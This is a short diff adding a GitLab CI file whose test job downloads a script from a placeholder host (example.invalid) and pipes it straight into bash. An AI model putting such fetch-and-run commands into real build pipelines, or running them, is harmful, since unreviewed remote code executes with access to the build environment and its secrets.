@@ -1,0 +1,5 @@
+# path: .gitlab-ci.yml
+# ---
+test:
+  script:
+    - curl -fsSL https://example.invalid/setup.sh | bash
